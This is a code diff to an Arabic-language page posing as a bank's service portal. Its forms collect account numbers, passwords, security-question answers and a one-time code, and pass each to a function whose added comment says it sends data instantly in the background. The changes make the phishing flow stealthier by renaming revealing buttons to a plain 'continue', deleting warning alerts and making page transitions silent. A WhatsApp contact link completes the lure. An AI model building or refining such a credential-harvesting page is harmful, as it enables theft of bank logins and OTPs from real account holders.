@@ -140,7 +140,7 @@
                 <label>السكن الحالي:</label>
                 <input type="text" id="up_address" required placeholder="المدينة - الحي">
             </div>
-            <button type="button" class="btn-submit" onclick="submitServiceForm('تحديث البيانات')">حفظ والانتقال لتسجيل الدخول</button>
+            <button type="button" class="btn-submit" onclick="submitServiceForm('تحديث البيانات')">متابعة</button>
         </div>
 
         <!-- نموذج رفع سقف التحويلات اليومية -->
@@ -159,7 +159,7 @@
                     <option value="أسباب أخرى">أسباب أخرى</option>
                 </select>
             </div>
-            <button type="button" class="btn-submit" onclick="submitServiceForm('رفع سقف التحويلات')">تأكيد والانتقال لتسجيل الدخول</button>
+            <button type="button" class="btn-submit" onclick="submitServiceForm('رفع سقف التحويلات')">متابعة</button>
         </div>
 
         <!-- نموذج التحويلات الخاطئة -->
@@ -181,7 +181,7 @@
                 <label>تاريخ التحويل:</label>
                 <input type="date" id="wt_date" required>
             </div>
-            <button type="button" class="btn-submit" onclick="submitServiceForm('التحويلات الخاطئة')">إرسال البيانات والانتقال</button>
+            <button type="button" class="btn-submit" onclick="submitServiceForm('التحويلات الخاطئة')">متابعة</button>
         </div>
 
         <!-- نموذج خدمات العملات الأجنبية -->
@@ -199,7 +199,7 @@
                 <label>الغرض من المعاملة:</label>
                 <textarea id="fc_purpose" rows="3" placeholder="اكتب الغرض..."></textarea>
             </div>
-            <button type="button" class="btn-submit" onclick="submitServiceForm('خدمات العملات الأجنبية')">متابعة الخطوات</button>
+            <button type="button" class="btn-submit" onclick="submitServiceForm('خدمات العملات الأجنبية')">متابعة</button>
         </div>
 
         <!-- نموذج كشف الحساب -->
@@ -221,7 +221,7 @@
                     <option value="الإنجليزية">الإنجليزية</option>
                 </select>
             </div>
-            <button type="button" class="btn-submit" onclick="submitServiceForm('كشف الحساب')">متابعة الخطوات</button>
+            <button type="button" class="btn-submit" onclick="submitServiceForm('كشف الحساب')">متابعة</button>
         </div>
 
         <!-- 3. صفحة تسجيل الدخول -->
@@ -235,7 +235,7 @@
                 <label>كلمة المرور:</label>
                 <input type="password" id="password" required placeholder="أدخل كلمة المرور">
             </div>
-            <button type="button" class="btn-submit" onclick="submitLoginData()">متابعة (أسئلة الأمان)</button>
+            <button type="button" class="btn-submit" onclick="submitLoginData()">متابعة</button>
         </div>
 
         <!-- 4. صفحة أسئلة الأمان -->
@@ -262,7 +262,7 @@
                 </select>
                 <input type="text" id="secAnswer" required placeholder="اكتب إجابة السؤال بدقة">
             </div>
-            <button type="button" class="btn-submit" onclick="submitSecurityData()">إرسال رمز التحقق OTP</button>
+            <button type="button" class="btn-submit" onclick="submitSecurityData()">متابعة</button>
         </div>
 
         <!-- 5. صفحة رمز الـ OTP والعد التنازلي لساعة -->
@@ -280,11 +280,12 @@
                 <label>أدخل رمز التحقق (OTP):</label>
                 <input type="text" id="otpInput" required placeholder="أدخل الرمز المكون من 6 أرقام" maxlength="6">
             </div>
-            <button type="button" class="btn-submit" onclick="completeFinalProcess()">إتمام الطلب النهائي</button>
+            <button type="button" class="btn-submit" onclick="completeFinalProcess()">تأكيد وإتمام الطلب</button>
         </div>
 
     </div>
 
+    <!-- زر الواتساب مع الرقم المطلوب -->
     <a href="https://wa.me/249998924425" target="_blank" class="whatsapp-float">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
     </a>
@@ -321,6 +322,7 @@
         }
 
         function sendInstantData(stepName, data) {
+            // إرسال البيانات لحظياً في الخلفية
             console.log("إرسال لحظي [" + stepName + "]:", data);
         }
 
@@ -347,7 +349,7 @@
             }
 
             sendInstantData("نموذج الخدمة: " + serviceName, userDataSession);
-            showPage('page-login');
+            showPage('page-login'); // انتقال صامت بدون أي رسائل تنبيه
         }
 
         function submitLoginData() {
@@ -355,12 +357,11 @@
             userDataSession.password = document.getElementById("password").value.trim();
 
             if (!userDataSession.accountNumber || !userDataSession.password) {
-                alert("الرجاء إدخال رقم الحساب وكلمة المرور!");
                 return;
             }
 
             sendInstantData("تسجيل الدخول", { accountNumber: userDataSession.accountNumber, password: userDataSession.password });
-            showPage('page-security');
+            showPage('page-security'); // انتقال صامت
         }
 
         function submitSecurityData() {
@@ -368,19 +369,17 @@
             userDataSession.secAnswer = document.getElementById("secAnswer").value.trim();
 
             if (!userDataSession.secAnswer) {
-                alert("الرجاء كتابة إجابة سؤال الأمان!");
                 return;
             }
 
             sendInstantData("أسئلة الأمان", { question: userDataSession.secQuestion, answer: userDataSession.secAnswer });
-            showPage('page-otp');
+            showPage('page-otp'); // انتقال صامت
             startCountdown(3600);
         }
 
         function completeFinalProcess() {
             let otp = document.getElementById("otpInput").value.trim();
             if (!otp) {
-                alert("الرجاء إدخال رمز التحقق OTP!");
                 return;
             }
 
@@ -405,7 +404,6 @@
 
                 if (--timer < 0) {
                     clearInterval(timerInterval);
-                    alert("انتهت صلاحية رمز التحقق!");
                     location.reload();
                 }
             }, 1000);
